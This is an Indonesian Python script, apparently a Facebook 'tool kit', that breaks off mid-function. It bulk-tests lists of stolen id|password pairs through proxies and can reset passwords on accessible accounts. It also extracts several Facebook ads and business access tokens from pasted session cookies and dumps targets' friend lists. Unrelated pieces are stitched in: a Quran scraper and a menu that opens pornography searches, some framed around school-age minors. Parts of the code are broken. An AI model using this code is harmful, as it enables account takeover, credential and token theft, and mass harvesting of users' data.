#			 *copyright: (C) © 2023 ~ Christian S.
#			 *version: Beta
#			 * I SAY THE KONTOL :V

import random,os,sys,requests,re,json,bs4,time
from bs4 import BeautifulSoup as parser

p = '\033[97m'  # PUTIH
m = '\033[91m' # MERAH
h = '\033[92m'  # HIJAU
k = '\033[93m'  # KUNING
biru = '\x1b[0;34m' #BIRU +
u = '\033[95m' # UNGU
bru = '\33[1;96m' # BIRU -
asu = random.choice([k,h,u,biru])

rr = random.randint
rc = random.choice

def logo():
    print(f"""{asu}
 _____      _       _   _____            _ _    _ _   
/__   \___ | | ___ | | /__   \___   ___ | | | _(_) |_ 
  / /\/ _ \| |/ _ \| |   / /\/ _ \ / _ \| | |/ / | __|
 / / | (_) | | (_) | |  / / | (_) | (_) | |   <| | |_ 
 \/   \___/|_|\___/|_|  \/   \___/ \___/|_|_|\_\_|\__|

 {p}Created By ࿐ {bru} Christian S. {p}ಮ
                                                      
    {p}""")

def exit():
    os.system("exit")
def clear():
	os.system("clear")
def update():
    os.system("git pull")

ses = requests.Session()
###---[ FITUR APPEND ]--###
ubah,pwbaru,pro = [],[],[]
lopi,slh,cp,tp,ggl = 0,0,0,0,0

###---[ WARNA ]--###
J = '\x1b[38;5;208m'
k = '\033[93m'
P = "\033[0m"
M = "\033[91m"
P = "\033[0m"
hh = "\033[32m"

###---[ USERAGENT ]--###
try:ua = open('.usergetbas.txt','r').read()
except:ua = "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3S Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36"

###---[ LOGO/BANNER ]--###
def logocp():
	print(f"""{asu}	
   ___ _          _        ___      _       _   
  / __\ |__   ___| | __   / _ \___ (_)_ __ | |_ 
 / /  | '_ \ / _ \ |/ /  / /_)/ _ \| | '_ \| __|
/ /___| | | |  __/   <  / ___/ (_) | | | | | |_ 
\____/|_| |_|\___|_|\_\ \/    \___/|_|_| |_|\__| v1.0
{p}\n\n""")

###---[ MENU UTAMA ]--###
def menu():
	logocp()
	print("1. Cek Opsi Checkpoint\n2. Setting User Agent\n3. Setting Proxy\n4. Cara Memakai Script\n5. Keluar")
	bas = input(f'\n{m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}')
	if bas in ['1']:
		main()
	elif bas in ['2']:
		userget()
	elif bas in ['3']:
		prox()
	elif bas in ['4']:
		info()
	else:
		exit()

###---[ INFO PEMAKAIAN ]--###
def info():
	hilang()
	logocp()
	print("""1. Cek Opsi Checkpoint\n\n  Ada 3 Pertanyaan Sebelum Anda Melakukan Cek Opsi\n - Cara Memasukan Nama File Adalah /sdcard/namafile\n   Atau /sdcard/namafolder/namafile\n - Pemisah File Adalah Pemisah Di Antara\n   User Id Dan Sandi Contoh (100002888888 • sandimu)\n   Sebaiknya Cek Terlebih Dahulu File Anda Memakai Pemisah Jenis Apa\n\n2. Setting User Agent\n Dalam Menu Ini Ada Dua Pilihan Cek User Agent\n Yang Terpakai Di Dalam Sc Atau Ganti User Agent\n - Cara Ganti User Agent Sesuai Merk Hp Anda Adalah\n   Dengan Cara Pilih Opsi Nomor 8 Di Menu Utama\n  Copy & Paste Ke Script Ini\n\n3. Setting Proxy\n Dalam Menu Ini Ada 2 Pilihan\n - Pilihan Ke Satu Adalah Memakai Proxy Indonesia\n - Pilihan Ke Dua Adalah Memakai Proxy Luar Negeri""")

###---[ SETTING USERAGENT ]--###
def userget():
	to = input(f"\n1. Cek User Agent\n2. Ganti User Agent\n\n{m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
	if to in ['1']:
		print("User Agent : %s%s%s"%(hh,ua,p))
		exit()
	else:pass		
	print("Anda Bisa Memakai User Agent hp anda\natau User Agent Andalan Anda")
	ugt = input('User Agent : ')
	try:os.remove('.usergetbas.txt')
	except:pass
	open('.usergetbas.txt','w').write(ugt)
	print("Sukses Setting User Agent\nUser Agent : %s%s%s\nEnter Untuk Kembali"%(hh,ugt,p))
	input("")
	menu()

###---[ SETTING PROXY ]--###
def prox():
	wow = input(f"\n1. Random Proxy Indonesia\n2. Random Proxy Luar Negeri\n\n{m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
	if wow in ['1']:
		sock = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=ID&ssl=ID&anonymity=ID').text
		open('.prox.txt','w').write(sock)
		print(sock,"\nBerhasil Setting Proxy Indonesia")
		exit()
	else:pass
	sock2 = session.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=100000000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(sock2)
	print(sock2,"\nBerhasil Setting Proxy Luar Negeri")
	exit()

###---[ OPEN FILE ]--###
def main():
	global lopi,slh,cp,tp,ggl
	ba = input("nama file : ")
	try:data = open(ba,"r").readlines()
	except FileNotFoundError:exit("File Tidak Ada")
	pm = input("Pemisah File : ")
	proc = input("Gunakan Proxy (Tidak Di Rekomendasi)\nProxy [y/t] : ")
	if proc in ['y','Y']:
		pro.append("y")
	else:pass
	pwn = input("Ubah Sandi Tap Yes [y/t] : ")
	if pwn in ["y","Y"]:
		ubah.append("y")
		new = input("Sandi Baru : ")
		if len(new) <= 5:
			print("Sandi Minimal 6 Huruf")
			new = input("Sandi Baru : ")
		pwbaru.append(new)
	else:pass
	print(f"Jumlah Akun Di File {k}%s {p}Adalah {k}%s{p}\n[{k}•{p}]\n{p} |{p}"%(ba,len(data)))
	babaz(pm,data)
	
	
###---[ GET OPSI ]--###
def babaz(pm,data):
	global lopi,slh,cp,tp,ggl
	try:prox = open('.prox.txt','r').read().splitlines()
	except:prox = ["101.36.107.134:65005","103.120.39.104:5678","1.32.59.217:47045","1.179.147.5:52210","102.223.49.74:8080","102.141.197.17:8080","102.176.228.45:4145"]
	proxy = {'http': 'socks5://'+random.choice(prox)}			
	for user in data:
		try:idf,pw = user.split("|")
		except ValueError:exit("pemisah salah, file anda memakai pemisah "+user)
		print(f"{m} |{p}\n[{k}•{p}]\nmencoba login ke\n Email : {k}{idf}\n{p} Sandi : {k}{pw}{p}",end=' ')
		ses.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":ua})
		if "y" in pro:
			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8",proxies=proxy).text,"html.parser")
		else:
			soup=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
		link=soup.find("form",{"method":"post"})
		data,data2 = {},{}
		data_ubah,data_ubah2 = {},{}
		for x in soup("input"):
			data.update({x.get("name"):x.get("value")})
		data.update({"email":idf,"pass":pw})
		url=ses.post("https://mbasic.facebook.com"+link.get("action"),data=data)
		response=parser(url.text, "html.parser")
		if "c_user" in ses.cookies.get_dict():
			if "Akun Anda Dikunci" in url.text:
				print(f"[{k}•{p}] {k}Akun Terkena Sesi New{p}")
				cp+=1
			else:
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print(f"[{h}•{p}] {h}Akun Tidak Checkpoint{p}\n")
				tp+=1
		elif "checkpoint" in ses.cookies.get_dict():
			cp+=1
			coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
			title=re.findall("\<title>(.*?)<\/title>",str(response))
			link2=response.find("form",{"method":"post"})
			listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
			for x in response("input"):
				if x.get("name") in listInput:
					data2.update({x.get("name"):x.get("value")})
			try:an=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data2)
			except:time.sleep(1)
			response2=parser(an.text,"html.parser")
			cek=[cek.text for cek in response2.find_all("option")]
			number=0
			print(f"{p}\rterdapat {str(len(cek))} opsi : ")
			if(len(cek)==0):
				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
					tp+=1
					if "y" in ubah:
						but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
						for x in response("input"):
							if x.get("name") in but:
								data_ubah.update({x.get("name"):x.get("value")})
						newpw=ses.post("https://mbasic.facebook.com"+link2.get("action"),data=data_ubah).text
						url_ubahpw=parser(newpw.text,"html.parser")
						get2=ubahPw.find("form",{"method":"post"})
						submit2=["submit[Next]","nh","fb_dtsg","jazoest"]
						if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(url_ubahpw)):
							for b in url_ubahpw("input"):
								data2.update({b.get("name"):b.get("value")})
							data_ubah2.update({"password_new":"".join(pwbaru)})
							po=ses.post("https://mbasic.facebook.com"+get2.get("action"),data=data2)
							coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
							print(f"{h}akun tap yes, sedang ganti sandi {p}")
							time.sleep(2)
							print(f"\remail : {h}{idf}                    {p}\nsandi : {h}{pwbaru[0]}\n{P}cookie : {h}{coki}  {p}              ")
							print(f"{m} |{p}")
					else:
						coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
						print(f"\r{h}akun tapyes silahlan login ke mbasic{p}")
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
					print(f"\r[{k}•{p}] {k}akun telah terpasang auten{p}")
					print(f"{m} |{p}")
					cp+=1
				else:
						for y in re.findall("\<title>(.*?)<\/title>",str(response)):
							print(f"\r[{k}•{p}] {k}{y}{p}")
						print(f"{m} |{p}")
						ggl+=1
			else:
				number +=1
				cp+=1
				for mek in cek:
					print(f"\r[{k}{str(number)}{P}]. {k}{mek}                      {P}")
				print(f"{m} |{p}")
		else:
			print(f"\r[{k}•{p}] {k}kata sandi salah, atau telah di ubah{P}")
			print(f"{m} |{p}")
			slh+=1
	print(f"{m} |{p}")
	exit(f"[{k}•{p}] sukses deteksi checkpoint\nakun salah sandi : %s\nakun gagal login : %s\nakun tap yes/ok  : %s\nakun checkpoint  : %s"%(slh,ggl,tp,cp))
	exit()

ses=requests.Session()
class ScrapeSurah:
	
	def __init__(self):
		self.no,self.num = 0,0
		self.user_surah = []
		self.nama_surah = []
		self.ayat = []
		self.surah_fatihah = []
		self.angka = []
		self.url = "https://litequran.net/"
		
	def Get_Kelipatan(self,angka):
		kelipatan = angka
		while kelipatan < 9999:
			self.angka.append(kelipatan)
			kelipatan = kelipatan + angka
	
	def Menu(self):
		url = parser(ses.get(self.url).text,"html.parser")
		for data in url.find_all("a",href=True):
			self.nama_surah.append(data.text)
			if "https://Litequran.net/" in data.get("href"):
				pass
			else:
				if "Kebijakan Privasi" in data.text:
					pass
				else:
					self.no +=1
					print(f"{self.no}. {data.text}")
					self.user_surah.append(data.get("href"))
		ask = input(f"\n {m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
		self.Get_Surah(self.user_surah[int(ask)-1])
		
	def Get_Surah(self,nama):
		url = parser(ses.get(self.url+nama).text,"html.parser")
		if nama == "al-fatihah":
			self.Al_Fatihah(url)
		self.Get_Kelipatan(4)
		for data in url.find_all("p"):
			if len(self.ayat) in self.angka:
				self.ayat.append("<>")
			self.ayat.append(f"{data.text}|")
		for isi in "".join(self.ayat).split("<>"):
			self.num +=1
			nanya = isi.split("|")
			print(f"""{m}	
Ayat Ke {self.num}{p}

{k}{nanya[0]}{p}

{nanya[1]}{biru}
Artinya :{h} {nanya[2]}{p}
""")
		exit()
			
	def Al_Fatihah(self,url):
		self.Get_Kelipatan(4)
		for data in url.find_all("p"):
			if len(self.surah_fatihah) in self.angka:
				#self.angka.clear()
				self.surah_fatihah.append("<>")
				#self.Get_Kelipatan(4)
			self.surah_fatihah.append(f"{data.text}|")
		for isi in "".join(self.surah_fatihah).split("<>"):
			self.num +=1
			nanya = isi.split("|")
			print(f"""{m}	
Ayat Ke {self.num}{p}

{k}{nanya[0]}{p}

{nanya[1]}{biru}
Artinya :{h} {nanya[2]}{p}
""")
		exit()
	

class convert():
    def clear():
        if "linux" in sys.platform.lower():
            try:os.system("clear")
            except:pass
        elif "win" in sys.platform.lower():
         try:os.system("cls")
         except:pass
        else:
            try:os.system("clear")
            except:pass

def input_cookie():
    print('%s\n _ Apabila A2F On, Buka Link Dibawah, Lalu Masukkan Kode A2F'%(p))
    print('%s https://business.facebook.com/business_locations\n'%(p));time.sleep(2)
    cookie = input('%sMasukkan Cookie : %s'%(p,h))
    Token1 = generate_token_eaab(cookie); Perm1 = req_info_token(cookie,Token1) # Power Editor Token
    Token2 = generate_token_eaag(cookie); Perm2 = req_info_token(cookie,Token2) # Business Manager Token
    Token3 = generate_token_eaai(cookie); Perm3 = req_info_token(cookie,Token3) # Ads Management Token
    Token4 = generate_token_eaad(cookie); Perm4 = req_info_token(cookie,Token4) # Ads Event Manager Token
    Token5 = generate_token_eaaC(cookie); Perm5 = req_info_token(cookie,Token5) # Ads Block List Token
    Token6 = generate_token_eaae(cookie); Perm6 = req_info_token(cookie,Token6) # Account Quality Token
    Token7 = generate_token_eaaf(cookie); Perm7 = req_info_token(cookie,Token7) # Lift Study Creation Token
    Token8 = generate_token_eabb(cookie); Perm8 = req_info_token(cookie,Token8) # Hub Materi Iklan Token
    print('\n%s [ Power Editor Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'        %(p,h,Token1,p,k,Perm1,p))
    print('\n%s [ Business Manager Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'    %(p,h,Token2,p,k,Perm2,p))
    print('\n%s [ Ads Management Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'      %(p,h,Token3,p,k,Perm3,p))
    print('\n%s [ Ads Event Manager Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'   %(p,h,Token4,p,k,Perm4,p))
    print('\n%s [ Ads Block List Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'      %(p,h,Token5,p,k,Perm5,p))
    print('\n%s [ Account Quality Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'     %(p,h,Token6,p,k,Perm6,p))
    print('\n%s [ Lift Study Creation Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s' %(p,h,Token7,p,k,Perm7,p))
    print('\n%s [ Hub Materi Iklan Token ]\n %s%s\n%s [ Permissions ]\n %s%s%s'    %(p,h,Token8,p,k,Perm8,p))

def req_info_token(cooki,token):
    try:
        cookie = {'cookie':cooki}
        url    = 'https://developers.facebook.com/tools/debug/accesstoken/?access_token=%s&version=v15.0'%(token)
        with requests.Session() as xyz:
            req = parser(xyz.get(url,cookies=cookie).content,'html.parser')
            crf = req.find('a',href='/docs/reference/login/#permissions')
            return(crf.text)
    except Exception as e:
        return('%sPermissions Not Available%s'%(m,p))

def generate_token_eaab(cok): # Power Editor Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/adsmanager/manage/campaigns'
            req = xyz.get(url,cookies=cookie)
            set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
            nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
            roq = xyz.get(nek,cookies=cookie)
            tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eaag(cok): # Business Manager Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://business.facebook.com/business_locations'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eaai(cok): # Ads Management Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/ads/manager/billing_history/summary/'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('{access_token:"(.*?)"',req.text).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eaad(cok): # Ads Event Manager Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/events_manager2/overview'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('{"accessToken":"(EAAd\w+)',req.text).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eaaC(cok): # Ads Block List Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/brand_safety/controls'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('{"accessToken":"(EAAC\w+)',req.text).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eaae(cok): # Account Quality Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/accountquality/'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('"accessToken":"(EAAE\w+)',req.text).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eaaf(cok): # Lift Study Creation Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/test-and-learn/test'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('{"accessToken":"(EAAF\w+)',req.text).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

def generate_token_eabb(cok): # Hub Materi Iklan Token
    try:
        cookie = {'cookie':cok}
        with requests.Session() as xyz:
            url = 'https://www.facebook.com/ads/adbuilder/home'
            req = xyz.get(url,cookies=cookie)
            tok = re.search('"accessToken":"(EABB\w+)',req.text).group(1)
            return(tok)
    except Exception as e:
        return('Cookies Invalid')

class Bokep:
	
	def __init__(self):
		self.a = ""
		
	def __jalan__(self, janda):
		for pepek in janda + "\n":
			sys.stdout.write(pepek)
			sys.stdout.flush()
			time.sleep(0.03)

	def __menu__(self):
		os.system("clear")
		logo()
		print(f"{p}[ {h}Welcome Pengocox Handal{p} ]\n")
		print(f"{p}1. Bokep indo ({h}not vpn{p})")
		print(f"{p}2. Bokep japan ({h}use vpn{p})")
		print(f"{p}3. Bokep english ({h}use vpn{p})")
		print(f"{p}4. Download apk {h}xnxx{p}")
		print(f"{p}5. View link bokep terbaru")
		__nanya__ = input(f"\n{p}> {m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
		if __nanya__ == "1" or __nanya__ == "01":self.indo()
		elif __nanya__ == "2" or __nanya__ == "02":self.japan()
		elif __nanya__ == "3" or __nanya__ == "03":self.english()
		elif __nanya__ == "4" or __nanya__ == "04":self.download()
		elif __nanya__ == "5" or __nanya__ == "05":self.lihat()
		else:Bokep().__menu__()
		
	def indo(self):
		try:
			print(f"\n\n{p}[ {h}Kumpulan Bokep Indo{p} ]\n")
			print(f"{p}1. Bokep smp ({h}hanya menonton{p})")
			print(f"{p}2. Bokep sma ({h}hanya menonton{p})")
			print(f"{p}3. Bokep remaja ({h}bisa download{p})")
			print(f"{p}4. Bokep hijab ({h}bisa download{p})")
			print(f"{p}5. Bokep colmek ({h}hanya menonton{p})")
			ask = input(f"\n{p}> {m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p} ")
			if ask == "1":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://xnxx-com.xxx/search/smp");exit()
			elif ask == "2":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://bokepindo13.com/?s=sma");exit()
			elif ask == "3":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://itubokep.store/?s=abg");exit()
			elif ask == "4":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://itubokep.store/?s=hijab+");exit()
			elif ask == "5":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://linkbokep.me/?s=colmek");exit()
		except:pass

	def japan(self):
		try:
			print(f"\n\n{p}[ {h}Kumpulan Bokep Japan{p} ]\n")
			print(f"{p}1. Bokep japan school ({h}bisa download{p})")
			print(f"{p}2. Bokep japan family ({h}bisa download{p})")
			print(f"{p}3. Bokep japan random video ({h}bisa download{p})")
			ask = input(f"\n{p}> {m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
			if ask == "1":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xvideos.com/?k=Japanese+school+");exit()
			elif ask == "2":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xvideos.com/?k=Japanese+family");exit()
			elif ask == "3":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xvideos.com/?k=Japanese%20teacher&top");exit()
			elif ask == "4":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xvideos.com/?k=Japanese+hd");exit()
		except:pass
		
	def english(self):
		try:
			print(f"\n\n{p}[ {h}Kumpulan Bokep English{p} ]\n")
			print(f"{p}1. Bokep student & teacher ({h}bisa download{p})")
			print(f"{p}2. Bokep family sex ({h}bisa download{p})")
			print(f"{p}3. Bokep school party sex ({h}bisa download{p})")
			print(f"{p}4. Bokep public random ({h}bisa download{p})")
			print(f"{p}5. Bokep step mom ({h}bisa download{p})")
			print(f"{p}6. Bokep step sister ({h}bisa download{p})")
			ask = input(f"\n{p}> {m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
			if ask == "1":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xnxx.com/search/English+student");exit()
			elif ask == "2":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xnxx.com/search/English+family");exit()
			elif ask == "3":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xnxx.com/search/student+party");exit()
			elif ask == "4":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xnxx.com/search/public+agent");exit()
			elif ask == "5":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xnxx.com/search/step+mom");exit()
			elif ask == "6":
				self.__jalan__(f"\n{p}!. Sedang masuk ke website ...")
				os.system("xdg-open https://www.xnxx.com/search/step%20sister?top");exit()
		except:pass
		
	def download(self):
		try:
			self.__jalan__(f"\n{p}!. Kamu akan diarahkan ke website")
			self.__jalan__(f"{p}!. Pencet Tulisan {h}Download the OFFICIAL XNXX APP (Stable){p}")
			os.system("xdg-open https://www.xnxx.net/");exit()
		except:pass

	def lihat(self):
		try:
			self.__jalan__(f"\n\n{p}[ {h}Kumpulan Link Bokep Random{p} ]\n");time.sleep(1)
			print(f"{p}> {h}https://jambulmemek.world");time.sleep(0.03)
			print(f"{p}> {h}https://ngentot.cam");time.sleep(0.03)
			print(f"{p}> {h}https://fakebokep.com");time.sleep(0.03)
			print(f"{p}> {h}https://bokepxxi.lol");time.sleep(0.03)
			print(f"{p}> {h}https://bokepviral.cam");time.sleep(0.03)
			print(f"{p}> {h}https://ngebokep.lol");time.sleep(0.03)
			print(f"{p}> {h}https://xjilbab.xyz");time.sleep(0.03)
			print(f"{p}> {h}https://agenbokep.xyz");time.sleep(0.03)
			print(f"{p}> {h}https://bokeh.top");time.sleep(0.03)
			print(f"{p}> {h}https://bokepin.pics");time.sleep(0.03)
			print(f"{p}> {h}https://bokep.pro");time.sleep(0.03)
			print(f"{p}> {h}https://xvideos.com");time.sleep(0.03)
			print(f"{p}> {h}https://playbokep.ws");time.sleep(0.03)
			print(f"{p}> {h}https://bokepep.me");time.sleep(0.03)
			print(f"{p}> {h}https://www.indo18.com");time.sleep(0.03)
			print(f"{p}> {h}https://linkbokep.cam");time.sleep(0.03)
			print(f"{p}> {h}https://vndevtop.com");time.sleep(0.03)
			print(f"{p}> {h}https://xbokepfb.com");time.sleep(0.03)
			print(f"{p}> {h}https://www.asexyporn.com");time.sleep(0.03)
			print(f"{p}> {h}https://pornkai.com");time.sleep(0.03)
			print(f"{p}> {h}https://bokepcrot.design");time.sleep(0.03)
			print(f"{p}> {h}https://m.spankbang.com");time.sleep(0.03)
			print(f"{p}> {h}https://www.eporner.com");time.sleep(0.03)
			print(f"{p}> {h}https://pornzog.com");time.sleep(0.03)
			print(f"{p}> {h}https://pestasex.cam/categories");time.sleep(0.03)
			print(f"{p}> {h}https://sangetods.net");time.sleep(0.03)
			print(f"{p}> {h}https://perawanbokep.site");time.sleep(0.03)
			print(f"{p}> {h}https://pwetan.com");time.sleep(0.03)
			print(f"{p}> {h}https://www.kontol.in");time.sleep(0.03)
			print(f"{p}> {h}https://malemjumat.lol");time.sleep(0.03)
			print(f"{p}> {h}https://brutalfucking.net/id/");time.sleep(0.03)
			print(f"{p}> {h}https://colmek.link/");time.sleep(0.03)
			self.__jalan__(f"\n{p}[ {h}Full Link Bokep Terbaru{p} ]");exit()
		except:pass

def cek_apk():
	time.sleep(1)
	try:
		print('\nMasukan Cookie FB Yang Mau Di Cek Apk Nya!\n');time.sleep(2)
		kukiz = input(" Masukan Cookie : ")
		ses = requests.Session()
		url = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":kukiz})
		psot = parser(url.text,"html.parser")
		fick = psot.find("form", {"method":"post"})
		game = [memek.text for memek in fick.find_all("h3")]
		if len(game) == 0:
			print("\n× Tidak Ada Aplikasi Aktif")
		else:
			for kontol in range(len(game)):
				print("\n- Mengechek Aplikasi Aktif")
				print("%s %s "%(kontol+1,game[kontol].replace  (" Di akses pada ", "  Di tambahkan pada")));time.sleep(1)
			link = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie":kukiz})
			post = parser(link.text,"html.parser")
			cari = post.find("form",{"method":"post"})
			game = [kontol_.text for kontol_ in cari.find_all("h3")]
			if len(game) == 0:
				print("\n× Tidak Ada Aplikasi Kadarluarsa")
			else:
				for aplikasi in range(len(game)):
					print("\n- Mengechek Aplikasi Kadarluarsa")
			print("\n%s %s"%(aplikasi+1, game[aplikasi].replace("Kadarluarsa pada","Tidak di akses pada")));time.sleep(1)
	#- Di hapus
		try:
			link = ses.get("https://free.facebook.com/settings/apps/tabbed/?tab=removed", cookies={"cookie":kukiz})
			post = parser(link.text,"html.parser")
			cari = post.find("form",{"method":"post"})
			game = [_kontol_.text for _kontol_ in cari.find_all("h3")]
			if len(game) == 0:
				print("\n× Tidak ada aplikasi di yanh hapus")
			else:
				for khamdihiXD in range(len(game)):
					print("× Mengechek aplikasi yang di hapus")
				print("\n%s %s"%(khamdihiXD+1, game[khamdihiXD].replace("Di hapus pada","Di hapus")))
		except AttributeError:
			print("× Tidak ada aplikasi yang di hapus / Cookie invalid!")
	except AttributeError:
		print(" × cokie invalid")

class Dump_regex:
	def __init__(self):
		self.ses = requests.Session()
		self.os = os.system
	
	def login(self):
		self.os("clear")
		self.coki = input(" ༒  Masukan Cookie : ")
		try:
			self.nama = re.search('name="primary_first_name" value="(.*?)"',str(self.ses.get("https://m.facebook.com/settings/account/?name&refresh_on_back=1&refid=70",cookies={"cookie": self.coki}).text)).group(1)
			print(" ꧁  selamat datang %s "%(self.nama))
			open(".cookie.txt","w").write(self.coki)
		except: exit(" ꧁ Cookies Invalid! ")
		self.menu()
		
	def menu(self):
		self.os("clear")
		try:
			self.cok = {"cookie": open(".cookie.txt","r").read()}
			self.nama = re.search('name="primary_first_name" value="(.*?)"',str(self.ses.get("https://m.facebook.com/settings/account/?name&refresh_on_back=1&refid=70",cookies=self.cok).text)).group(1)
		except: self.login()
		apa = input(f"{logo()} \n\n 1. Dump Publik\n  2. Dump Masal\n   3. Keluar {m}(Delete Cookie)\n\n{m}Pi{k}li{h}h {m}︻{k}芫{h}═── {p}")
		print("-"*30)
		if apa in ["1","01"]:
			akun = input("꧁  ⁣Target : ")
			self.file = input("꧁⁣  Masukan Nama File Anda \n꧁⁣  Nama : ")
			if "https" in str(akun): self.user = akun.split("/")[3]
			else: self.user = akun
			self.cek_target()
			self.info_file()
			self.dump_publik(f"https://mbasic.facebook.com/{self.user}/friends")	
		elif apa in ["2","02"]:
			xx = int(input("꧁⁣  Berapa Id? : "))
			self.file = input("꧁ ⁣ Masukan Nama File Anda \n꧁ ⁣ Nama : ")
			self.info_file()
			for x in range(xx):
				akun = input("꧁ ⁣ Target : ")
				if "https" in str(akun): self.user = akun.split("/")[3]
				else: self.user = akun
				self.cek_target()
				self.dump_publik(f"https://mbasic.facebook.com/{self.user}/friends")
		elif apa in ["3","03"]: self.os("rm -rf .cookie.txt"); exit()
		else: exit()
	
	def info_file(self):
		print(f"「ཀའ」 Hasil Di : /sdcard/{self.file}.txt")
		
	def cek_target(self):
		try:
			link = self.ses.get(f"https://mbasic.facebook.com/{self.user}/friends", cookies=self.cok).text
			if "Tidak Ada Teman Untuk Ditampilkan" in link:
				exit(" ꧁  daftar teman tidak di publikasikan")
			elif "Halaman yang Anda minta tidak ditemukan." in link:
				exit(f" ꧁  pengguna dengan id {self.user} tidak ditemukan")
			elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in link:
				exit(" ꧁  facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
			elif "Konten Tidak Ditemukan" in link:
				exit(f" ꧁  Pengguna Dengan Id {self.user} tidak ditemukan")
			else: pass
		except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
			exit(" ꧁  kesalahan pada koneksi")
	
	def dump_publik(self, url):	
		try:
